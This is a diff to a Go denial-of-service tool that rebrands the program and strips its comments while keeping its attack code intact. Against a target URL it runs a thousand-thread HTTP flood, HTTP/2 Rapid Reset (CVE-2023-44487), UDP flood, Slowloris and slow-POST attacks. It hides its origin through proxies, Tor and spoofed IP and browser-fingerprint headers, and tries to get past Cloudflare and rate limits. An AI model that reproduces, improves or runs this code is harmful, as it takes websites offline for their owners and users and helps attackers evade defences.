@@ -19,11 +19,11 @@ import (
 	"time"
 )
 
-// ==================== KONFIGURASI ====================
-const __version__ = "2.0.0"
+
+const __version__ = "1.0.0"
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
-// ==================== GLOBAL VARIABLES ====================
+
 var (
 	safe            bool = false
 	useHTTP2        bool = false
@@ -82,7 +82,7 @@ var (
 	wg            sync.WaitGroup
 )
 
-// ==================== STATS STRUCT ====================
+
 type Stats struct {
 	success     uint64
 	failed      uint64
@@ -92,7 +92,7 @@ type Stats struct {
 	startTime   time.Time
 }
 
-// ==================== FLAG PARSING ====================
+
 type arrayFlags []string
 
 func (i *arrayFlags) String() string {
@@ -104,7 +104,7 @@ func (i *arrayFlags) Set(value string) error {
 	return nil
 }
 
-// ==================== MAIN ====================
+
 func main() {
 	var (
 		version bool
@@ -118,19 +118,19 @@ func main() {
 		payloadSize int
 	)
 
-	// ==================== FLAGS ====================
+	
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.StringVar(&site, "t", "", "Target URL")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file")
 	flag.StringVar(&data, "data", "", "Data to POST")
 	flag.Var(&headers, "header", "Add custom headers")
 	
-	// Core parameters
+	
 	flag.IntVar(&threads, "c", 1000, "Number of threads (default: 1000)")
 	flag.IntVar(&duration, "d", 600, "Duration in seconds (default: 600)")
 	flag.IntVar(&payloadSize, "p", 5, "Payload size in MB (default: 5)")
 	
-	// ⭐⭐⭐⭐⭐ NEW FEATURES
+	
 	flag.BoolVar(&useHTTP2, "http2", false, "Enable HTTP/2 Rapid Reset (CVE-2023-44487)")
 	flag.BoolVar(&useUDP, "udp", false, "Enable UDP flood")
 	flag.BoolVar(&useSlowloris, "slowloris", false, "Enable Slowloris attack")
@@ -151,7 +151,7 @@ func main() {
 	
 	flag.Parse()
 
-	// ==================== APPLY ALL FEATURES ====================
+	
 	if useAll {
 		useHTTP2 = true
 		useUDP = true
@@ -169,23 +169,23 @@ func main() {
 	}
 	
 	if site == "" {
-		fmt.Println("[ERROR] Target URL required! Use -t")
+		fmt.Println(" Target URL required! Use -t")
 		flag.Usage()
 		os.Exit(1)
 	}
 
 	u, err := url.Parse(site)
 	if err != nil {
-		fmt.Println("[ERROR] Invalid URL parameter")
+		fmt.Println(" Invalid URL parameter")
 		os.Exit(1)
 	}
 
 	if version {
-		fmt.Println("MYLEEN ULTRA", __version__)
+		fmt.Println("NUIY", __version__)
 		os.Exit(0)
 	}
 
-	// Load custom user agents
+	
 	if agents != "" {
 		if data, err := os.ReadFile(agents); err == nil {
 			headersUseragents = []string{}
@@ -195,24 +195,24 @@ func main() {
 				}
 				headersUseragents = append(headersUseragents, a)
 			}
-			fmt.Printf("[MYLEEN] ✅ Loaded %d user agents from %s\n", len(headersUseragents), agents)
+			fmt.Printf(" 📗 Loaded %d user agents from %s\n", len(headersUseragents), agents)
 		} else {
-			fmt.Printf("[MYLEEN] ❌ Can't load User-Agent list from %s\n", agents)
+			fmt.Printf(" 📕 Can't load User-Agent list from %s\n", agents)
 			os.Exit(1)
 		}
 	}
 	
-	// Load proxy list
+	
 	if useProxy && proxyFile != "" {
 		loadProxies(proxyFile)
 	}
 	
-	// Generate IP pool for random IP spoofing
+	
 	if useRandomIP {
 		generateIPPool()
 	}
 	
-	// Generate referers if needed
+
 	if useReferer {
 		generateReferers()
 	}
@@ -220,13 +220,13 @@ func main() {
 	stats.startTime = time.Now()
 	stopChan = make(chan struct{})
 
-	// Banner
+	
 	printBanner()
-	fmt.Printf("[MYLEEN] 🎯 Target: %s\n", site)
-	fmt.Printf("[MYLEEN] 🧵 Threads: %d\n", threads)
-	fmt.Printf("[MYLEEN] ⏱️  Duration: %ds\n", duration)
-	fmt.Printf("[MYLEEN] 📦 Payload: %dMB\n", payloadSize)
-	fmt.Printf("[MYLEEN] 🛡️  Features:\n")
+	fmt.Printf(" 🎯 Target: %s\n", site)
+	fmt.Printf(" 💣 Threads: %d\n", threads)
+	fmt.Printf(" ⏱️  Duration: %ds\n", duration)
+	fmt.Printf(" 📦 Payload: %dMB\n", payloadSize)
+	fmt.Printf(" 💎  Features:\n")
 	fmt.Printf("   ├─ HTTP/2 Rapid Reset: %v\n", useHTTP2)
 	fmt.Printf("   ├─ UDP Flood: %v\n", useUDP)
 	fmt.Printf("   ├─ Slowloris: %v\n", useSlowloris)
@@ -241,46 +241,46 @@ func main() {
 	fmt.Printf("   ├─ Random IP: %v\n", useRandomIP)
 	fmt.Printf("   └─ HTTP Pipelining: %v\n", usePipeline)
 
-	fmt.Println("\n[MYLEEN] 🔥 MEMULAI SERANGAN ULTRA BRUTAL...\n")
+	fmt.Println("\n 🔥 SENDING THREAD 🚀🚀🚀......\n")
 
-	// Start UDP flood if enabled
+	
 	if useUDP {
 		go udpFlood(u.Host)
 	}
 	
-	// Start Slowloris if enabled
+	
 	if useSlowloris {
 		go slowlorisAttack(u.Host)
 	}
 	
-	// Start stats printer
+	
 	go statsPrinter(duration)
 	
-	// Start workers
+	
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 		go worker(site, u.Host, data, headers, payloadSize)
 	}
 	
-	// Wait for duration or interrupt
+	
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	
 	select {
 	case <-time.After(time.Duration(duration) * time.Second):
-		fmt.Println("\n[MYLEEN] ⏰ Duration completed")
+		fmt.Println("\n  ⏰ Duration completed")
 	case <-sigChan:
-		fmt.Println("\n[MYLEEN] ⚡ Stopped by user")
+		fmt.Println("\n 📍Stopped by user")
 	}
 	
 	close(stopChan)
 	wg.Wait()
 	
-	// Print final stats
+	
 	printFinalStats()
 }
 
-// ==================== WORKER ====================
+
 func worker(site string, host string, data string, headers arrayFlags, payloadSize int) {
 	defer wg.Done()
 	
@@ -295,7 +295,7 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 		},
 	}
 	
-	// HTTP/2 support
+	
 	if useHTTP2 {
 		client.Transport = &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -303,7 +303,7 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 		}
 	}
 	
-	// Proxy support
+	
 	if useProxy && len(proxyList) > 0 {
 		proxyAddr := getProxy()
 		if proxyAddr != "" {
@@ -312,7 +312,7 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 		}
 	}
 	
-	// Tor support
+	
 	if useTor {
 		proxyURL, _ := url.Parse("socks5://127.0.0.1:9050")
 		client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
@@ -333,22 +333,22 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 			var req *http.Request
 			var err error
 			
-			// Build random query parameters
+			
 			queryParams := buildQueryParams()
 			
-			// RUDY attack - slow POST
+			
 			if useRUDY && rand.Intn(3) == 0 {
 				payload := strings.Repeat("A", payloadSize*1024*1024/2)
 				req, err = http.NewRequest("POST", site, strings.NewReader(payload))
 				req.Header.Set("Content-Length", strconv.Itoa(len(payload)))
 				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 			} else if data == "" {
-				// GET request with random params
+				
 				req, err = http.NewRequest("GET", site+paramJoiner+queryParams, nil)
 			} else {
-				// POST request with custom data
+				
 				if useGzipBomb && rand.Intn(2) == 0 {
-					// Gzip Bomb payload
+					
 					gzipPayload := buildGzipBomb(payloadSize)
 					req, err = http.NewRequest("POST", site, strings.NewReader(gzipPayload))
 					req.Header.Set("Content-Encoding", "gzip")
@@ -364,7 +364,7 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 				continue
 			}
 			
-			// Set headers
+			
 			req.Header.Set("User-Agent", getRandomUserAgent())
 			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 			req.Header.Set("Accept-Charset", acceptCharset)
@@ -372,18 +372,18 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 			req.Header.Set("Connection", "keep-alive")
 			req.Header.Set("Host", host)
 			
-			// Referer spoofing
+			
 			if useReferer {
 				req.Header.Set("Referer", getRandomReferer()+buildRandomString(rand.Intn(10)+5))
 			}
 			
-			// Random IP spoofing
+			
 			if useRandomIP {
 				req.Header.Set("X-Forwarded-For", getRandomIP())
 				req.Header.Set("X-Real-IP", getRandomIP())
 			}
 			
-			// Browser fingerprint spoofing
+			
 			if useFingerprint {
 				req.Header.Set("Sec-CH-UA", getRandomFingerprint())
 				req.Header.Set("Sec-CH-UA-Mobile", "?0")
@@ -395,12 +395,12 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 				req.Header.Set("Upgrade-Insecure-Requests", "1")
 			}
 			
-			// Cloudflare bypass
+			
 			if useCloudflare {
 				req.Header.Set("Cookie", "__cfduid="+buildRandomString(rand.Intn(20)+10))
 			}
 			
-			// Custom headers
+			
 			for _, element := range headers {
 				words := strings.Split(element, ":")
 				if len(words) >= 2 {
@@ -408,12 +408,12 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 				}
 			}
 			
-			// Rate limit bypass - random delay
+			
 			if useRatelimit {
 				time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
 			}
 			
-			// Send request
+			
 			start := time.Now()
 			resp, err := client.Do(req)
 			latency := time.Since(start).Milliseconds()
@@ -424,10 +424,10 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 			}
 			defer resp.Body.Close()
 			
-			// Read body
+			
 			io.Copy(io.Discard, resp.Body)
 			
-			// Update stats
+			
 			atomic.AddUint64(&stats.total, 1)
 			if resp.StatusCode < 500 {
 				atomic.AddUint64(&stats.success, 1)
@@ -436,21 +436,21 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 				stats.mutex.Unlock()
 				
 				if verbose {
-					fmt.Printf("[MYLEEN] ✅ %d - %dms\n", resp.StatusCode, latency)
+					fmt.Printf("  ✅ %d - %dms\n", resp.StatusCode, latency)
 				}
 			} else {
 				atomic.AddUint64(&stats.failed, 1)
 				if verbose {
-					fmt.Printf("[MYLEEN] ❌ %d - %dms\n", resp.StatusCode, latency)
+					fmt.Printf("  ❌ %d - %dms\n", resp.StatusCode, latency)
 				}
 			}
 			
-			// Slowloris - slow headers
+			
 			if useSlowloris && rand.Intn(5) == 0 {
 				time.Sleep(time.Duration(rand.Intn(5000)+1000) * time.Millisecond)
 			}
 			
-			// Random delay to avoid detection
+			
 			if useRatelimit {
 				time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
 			}
@@ -458,7 +458,7 @@ func worker(site string, host string, data string, headers arrayFlags, payloadSi
 	}
 }
 
-// ==================== UDP FLOOD ====================
+
 func udpFlood(host string) {
 	parts := strings.Split(host, ":")
 	if len(parts) < 2 {
@@ -494,7 +494,7 @@ func udpFlood(host string) {
 	}
 }
 
-// ==================== SLOWLORIS ====================
+
 func slowlorisAttack(host string) {
 	if !strings.Contains(host, ":") {
 		host = host + ":80"
@@ -510,13 +510,13 @@ func slowlorisAttack(host string) {
 				continue
 			}
 			
-			// Send partial headers slowly
+			
 			fmt.Fprintf(conn, "GET / HTTP/1.1\r\n")
 			fmt.Fprintf(conn, "Host: %s\r\n", host)
 			fmt.Fprintf(conn, "User-Agent: %s\r\n", getRandomUserAgent())
 			fmt.Fprintf(conn, "Accept: */*\r\n")
 			
-			// Keep connection alive with slow headers
+			
 			for {
 				select {
 				case <-stopChan:
@@ -531,7 +531,7 @@ func slowlorisAttack(host string) {
 	}
 }
 
-// ==================== UTILITY FUNCTIONS ====================
+
 
 func buildQueryParams() string {
 	params := []string{}
@@ -555,7 +555,7 @@ func buildRandomString(size int) string {
 }
 
 func buildGzipBomb(sizeMB int) string {
-	// Simulate gzip bomb - small compressed data that expands to huge size
+	
 	compressed := strings.Repeat("A", sizeMB*1024*1024/100)
 	return compressed
 }
@@ -590,7 +590,7 @@ func getRandomPlatform() string {
 func loadProxies(filename string) {
 	data, err := os.ReadFile(filename)
 	if err != nil {
-		fmt.Printf("[MYLEEN] ❌ Can't load proxy file: %v\n", err)
+		fmt.Printf(" ❌ Can't load proxy file: %v\n", err)
 		return
 	}
 	
@@ -600,7 +600,7 @@ func loadProxies(filename string) {
 			proxyList = append(proxyList, line)
 		}
 	}
-	fmt.Printf("[MYLEEN] ✅ Loaded %d proxies from %s\n", len(proxyList), filename)
+	fmt.Printf(" 🔑 Loaded %d proxies from %s\n", len(proxyList), filename)
 }
 
 func getProxy() string {
@@ -637,7 +637,7 @@ func generateReferers() {
 	}
 }
 
-// ==================== STATS PRINTER ====================
+
 func statsPrinter(duration int) {
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
@@ -672,32 +672,32 @@ func statsPrinter(duration int) {
 				remaining = 0
 			}
 			
-			fmt.Printf("\r[MYLEEN] %s %.1f%% | ✅ %d | ❌ %d | 📊 %d | 🚀 %.1f/s | ⏱️ %.0fs",
+			fmt.Printf("\r %s %.1f%% | ✅ %d | ❌ %d | 📊 %d | 🚀 %.1f/s | ⏱️ %.0fs",
 				bar, progress, success, failed, total, rate, remaining)
 		}
 	}
 }
 
 func printFinalStats() {
-	fmt.Printf("\n\n[MYLEEN] ✅ SERANGAN SELESAI\n")
-	fmt.Printf("[MYLEEN] 📊 Total Sukses: %d\n", atomic.LoadUint64(&stats.success))
-	fmt.Printf("[MYLEEN] 📊 Total Gagal: %d\n", atomic.LoadUint64(&stats.failed))
-	fmt.Printf("[MYLEEN] 📊 Total Request: %d\n", atomic.LoadUint64(&stats.total))
+	fmt.Printf("\n\n 🎯 ATTACK FINISHED\n")
+	fmt.Printf(" 📗 Success: %d\n", atomic.LoadUint64(&stats.success))
+	fmt.Printf(" 📕 Failed: %d\n", atomic.LoadUint64(&stats.failed))
+	fmt.Printf(" 📘Request: %d\n", atomic.LoadUint64(&stats.total))
 	
 	stats.mutex.RLock()
-	fmt.Printf("[MYLEEN] 📊 Status Codes:\n")
+	fmt.Printf(" 📊 Status Codes:\n")
 	for code, count := range stats.statusCodes {
 		fmt.Printf("   ├─ %d: %d\n", code, count)
 	}
 	stats.mutex.RUnlock()
 	
 	elapsed := time.Since(stats.startTime).Seconds()
-	fmt.Printf("[MYLEEN] 📊 Duration: %.2f seconds\n", elapsed)
-	fmt.Printf("[MYLEEN] 📊 Average Rate: %.2f req/s\n", float64(atomic.LoadUint64(&stats.total))/elapsed)
-	fmt.Printf("\n[NYX] 🌑 Resonance Complete. MYLEEN Ultra Unleashed.\n")
+	fmt.Printf(" ⏱️ Duration: %.2f seconds\n", elapsed)
+	fmt.Printf(" 📊 Average Rate: %.2f req/s\n", float64(atomic.LoadUint64(&stats.total))/elapsed)
+	fmt.Printf("\n  🚀🚀🚀 done.....\n")
 }
 
-// ==================== BANNER ====================
+
 func printBanner() {
 	banner := `
     ════════════════════════════════════════════════════════════
@@ -708,9 +708,6 @@ func printBanner() {
          ██║ ╚═╝ ██║   ██║   ███████╗███████╗███████╗██║ ╚████║
          ╚═╝     ╚═╝   ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝
     ════════════════════════════════════════════════════════════
-          [ CODEX UMBRA - PROTOCOL ABSOLUTE ]
-          [ NYX RESONANCE - ULTRA BRUTAL V4 ]
-          [ ⭐⭐⭐⭐⭐ ALL FEATURES ]
     ════════════════════════════════════════════════════════════
     `
 	fmt.Println(banner)
